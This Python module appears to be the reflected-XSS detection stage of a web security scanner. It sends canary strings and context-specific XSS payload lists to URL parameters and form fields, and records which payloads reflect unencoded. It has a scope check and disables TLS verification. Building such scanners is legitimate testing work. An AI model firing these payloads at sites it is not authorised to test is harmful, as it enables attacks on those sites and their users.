"""
reflection-detector node — deterministic HTTP reflection + payload analysis.

Phase 1 — Canary: confirm the parameter reflects input at all.
Phase 2 — Context: identify injection context (html-body, attribute, script-block, etc.).
Phase 3 — Payloads: for confirmed-reflection params, test a prioritised payload set
           and record which payloads appear unencoded in the response.

The node does NOT execute JavaScript — that is the browser validation node.
It detects TEXTUAL reflection of XSS payloads, which is strong evidence.

Inputs:  target_url, urls_with_params (list[str]), forms (list[dict])
Outputs: candidates (list[dict]), candidate_count (int), inputs_analyzed (int)
Config:  max_candidates (int, 50), http_timeout (int, 12)
"""
from __future__ import annotations

import hashlib
import time
import re
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from xscan.core.dag.node_registry import registry
from xscan.nodes.base import NodeBase, ExecutionContext
from xscan.nodes.emitter import NodeEmitter

_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"
)

# ── Payload sets by context ──────────────────────────────────────────────────
# Ordered by likelihood of success — first working payload is recorded.

_PAYLOADS_HTML_BODY = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<body onload=alert(1)>',
]

_PAYLOADS_HTML_ATTRIBUTE = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)'",
    '" autofocus onfocus="alert(1)',
    '"><script>alert(1)</script>',
    '" style="animation-name:rotation" onanimationstart="alert(1)',
]

_PAYLOADS_SCRIPT_BLOCK = [
    '"-alert(1)-"',
    "'-alert(1)-'",
    '";alert(1)//',
    "';alert(1)//",
    '\';alert(1)//',
    '`-alert(1)-`',
]

_PAYLOADS_GENERIC = _PAYLOADS_HTML_BODY  # fallback

_CONTEXT_PAYLOADS = {
    "html-body":            _PAYLOADS_HTML_BODY,
    "html-attribute-value": _PAYLOADS_HTML_ATTRIBUTE,
    "html-attribute":       _PAYLOADS_HTML_ATTRIBUTE,
    "script-block":         _PAYLOADS_SCRIPT_BLOCK,
    "html-comment":         ['--><script>alert(1)</script>'],
    "unknown":              _PAYLOADS_GENERIC,
}

# Quick check payloads to detect encoding vs no-encoding
_ENCODING_PROBES = {
    "<":   "&lt;",
    ">":   "&gt;",
    '"':   "&quot;",
    "'":   "&#x27;",
}


def _canary(salt: str) -> str:
    return "xsc" + hashlib.md5(f"{salt}{time.time()}".encode()).hexdigest()[:8]


@registry.register("reflection-detector")
class ReflectionDetectorNode(NodeBase, NodeEmitter):
    node_type = "reflection-detector"

    def execute(self, ctx: ExecutionContext) -> dict[str, Any]:
        t0 = self.emit_started(ctx)

        urls_with_params: list[str] = ctx.get("urls_with_params", [])
        forms:            list[dict] = ctx.get("forms", [])
        max_candidates:   int = int(ctx.config.get("max_candidates", 50))
        http_timeout:     int = int(ctx.config.get("http_timeout", 12))

        candidates: list[dict] = []
        inputs_analyzed = 0

        with httpx.Client(
            follow_redirects=True,
            timeout=http_timeout,
            verify=False,
            headers={"User-Agent": _UA},
        ) as client:

            for url in urls_with_params:
                if len(candidates) >= max_candidates:
                    break
                for param in list(parse_qs(urlparse(url).query).keys()):
                    if len(candidates) >= max_candidates:
                        break
                    inputs_analyzed += 1
                    c = self._probe_url_param(client, ctx, url, param)
                    if c:
                        candidates.append(c)

            for form in forms:
                if len(candidates) >= max_candidates:
                    break
                for inp in form.get("inputs", []):
                    if len(candidates) >= max_candidates:
                        break
                    param = inp.get("name", "")
                    if not param:
                        continue
                    inputs_analyzed += 1
                    c = self._probe_form_input(client, ctx, form, param)
                    if c:
                        candidates.append(c)

        ms = (time.monotonic() - t0) * 1000
        self.emit_completed(ctx, metrics={
            "inputs_analyzed": inputs_analyzed,
            "reflections":     len(candidates),
        }, duration_ms=ms)

        return {
            "candidates":      candidates,
            "candidate_count": len(candidates),
            "inputs_analyzed": inputs_analyzed,
        }

    # ------------------------------------------------------------------
    # URL parameter probing
    # ------------------------------------------------------------------

    def _probe_url_param(self, client, ctx, url, param) -> dict | None:
        # Phase 1: canary
        canary = _canary(param)
        probe_url = self._inject_param(url, param, canary)
        try:
            ctx.scope.assert_allowed(probe_url, operation="http_request")
            resp = client.get(probe_url)
        except Exception:
            return None
        if resp.status_code == 0 or canary not in resp.text:
            return None

        context = self._detect_context(resp.text, canary)
        evidence_snippet = self._snippet(resp.text, canary)

        # Phase 2: encoding check
        encoding = self._check_encoding(client, ctx, url, param)

        # Phase 3: payload testing
        working_payloads = self._test_payloads(client, ctx, url, param, context, "GET")

        return {
            "url":              url,
            "parameter":        param,
            "method":           "GET",
            "context":          context,
            "evidence":         evidence_snippet,
            "encoding":         encoding,
            "working_payloads": working_payloads,
            "payload_count":    len(working_payloads),
            "request_url":      probe_url,
        }

    def _probe_form_input(self, client, ctx, form, param) -> dict | None:
        canary = _canary(param)
        action = form["action"]
        method = form["method"]
        data = {
            inp["name"]: canary if inp["name"] == param else (inp.get("value") or "test")
            for inp in form["inputs"]
        }
        try:
            ctx.scope.assert_allowed(action, operation="http_request")
            resp = client.post(action, data=data) if method == "POST" else client.get(action, params=data)
        except Exception:
            return None
        if resp.status_code == 0 or canary not in resp.text:
            return None

        context = self._detect_context(resp.text, canary)
        evidence_snippet = self._snippet(resp.text, canary)
        encoding = self._check_encoding_form(client, ctx, form, param, method)
        working_payloads = self._test_payloads_form(client, ctx, form, param, context, method)

        return {
            "url":              action,
            "parameter":        param,
            "method":           method,
            "context":          context,
            "evidence":         evidence_snippet,
            "encoding":         encoding,
            "working_payloads": working_payloads,
            "payload_count":    len(working_payloads),
            "form":             form,
        }

    # ------------------------------------------------------------------
    # Payload testing
    # ------------------------------------------------------------------

    def _test_payloads(
        self, client, ctx, url: str, param: str,
        context: str, method: str,
    ) -> list[dict]:
        """Test context-appropriate payloads. Return those that reflect unencoded."""
        payloads = _CONTEXT_PAYLOADS.get(context, _PAYLOADS_GENERIC)
        results: list[dict] = []
        for payload in payloads:
            probe_url = self._inject_param(url, param, payload)
            try:
                ctx.scope.assert_allowed(probe_url, operation="http_request")
                resp = client.get(probe_url)
            except Exception:
                continue
            if resp.status_code == 0:
                continue
            reflected, encoded = self._check_payload_reflection(resp.text, payload)
            if reflected:
                snippet = self._snippet(resp.text, payload, ctx_chars=100)
                results.append({
                    "payload":   payload,
                    "reflected": True,
                    "encoded":   encoded,
                    "snippet":   snippet,
                    "url":       probe_url,
                })
                if not encoded:
                    # Found unencoded working payload — enough evidence
                    break
        return results

    def _test_payloads_form(
        self, client, ctx, form: dict, param: str,
        context: str, method: str,
    ) -> list[dict]:
        payloads = _CONTEXT_PAYLOADS.get(context, _PAYLOADS_GENERIC)
        results: list[dict] = []
        action = form["action"]
        for payload in payloads:
            data = {
                inp["name"]: payload if inp["name"] == param else (inp.get("value") or "test")
                for inp in form["inputs"]
            }
            try:
                ctx.scope.assert_allowed(action, operation="http_request")
                resp = client.post(action, data=data) if method == "POST" else client.get(action, params=data)
            except Exception:
                continue
            if resp.status_code == 0:
                continue
            reflected, encoded = self._check_payload_reflection(resp.text, payload)
            if reflected:
                results.append({
                    "payload":   payload,
                    "reflected": True,
                    "encoded":   encoded,
                    "snippet":   self._snippet(resp.text, payload, ctx_chars=100),
                })
                if not encoded:
                    break
        return results

    # ------------------------------------------------------------------
    # Encoding check
    # ------------------------------------------------------------------

    def _check_encoding(self, client, ctx, url: str, param: str) -> dict:
        """Check whether special characters are HTML-encoded in the reflection."""
        result: dict[str, bool] = {}
        for char, encoded_form in _ENCODING_PROBES.items():
            probe_url = self._inject_param(url, param, f"xsc{char}xsc")
            try:
                ctx.scope.assert_allowed(probe_url, operation="http_request")
                resp = client.get(probe_url)
                if resp.status_code != 0:
                    # If raw char appears → not encoded. If encoded form → encoded.
                    raw_present     = f"xsc{char}xsc" in resp.text
                    encoded_present = f"xsc{encoded_form}xsc" in resp.text
                    result[char] = not raw_present and encoded_present
            except Exception:
                pass
        return result

    def _check_encoding_form(self, client, ctx, form: dict, param: str, method: str) -> dict:
        result: dict[str, bool] = {}
        action = form["action"]
        for char, encoded_form in _ENCODING_PROBES.items():
            data = {
                inp["name"]: f"xsc{char}xsc" if inp["name"] == param else (inp.get("value") or "test")
                for inp in form["inputs"]
            }
            try:
                ctx.scope.assert_allowed(action, operation="http_request")
                resp = client.post(action, data=data) if method == "POST" else client.get(action, params=data)
                if resp.status_code != 0:
                    raw_present = f"xsc{char}xsc" in resp.text
                    result[char] = not raw_present
            except Exception:
                pass
        return result

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _check_payload_reflection(body: str, payload: str) -> tuple[bool, bool]:
        """
        Returns (reflected, encoded).
        reflected = payload or a version of it appears in the body
        encoded   = the characters were HTML-entity encoded
        """
        if payload in body:
            return True, False
        # Check for entity-encoded version
        import html
        encoded = html.escape(payload)
        if encoded in body and encoded != payload:
            return True, True
        return False, False

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse(parsed._replace(query=new_query))

    @staticmethod
    def _detect_context(body: str, canary: str) -> str:
        idx = body.find(canary)
        if idx == -1:
            return "unknown"
        before = body[max(0, idx - 100):idx]
        if re.search(r"<script[^>]*>[^<]*$", before, re.I):
            return "script-block"
        if re.search(r'=\s*["\']?\s*$', before):
            return "html-attribute-value"
        if re.search(r"<[a-z]+[^>]*$", before, re.I):
            return "html-attribute"
        if re.search(r"<!--", before):
            return "html-comment"
        return "html-body"

    @staticmethod
    def _snippet(body: str, marker: str, ctx_chars: int = 80) -> str:
        idx = body.find(marker)
        if idx == -1:
            return ""
        return body[max(0, idx - ctx_chars): idx + len(marker) + ctx_chars].replace("\n", " ").strip()
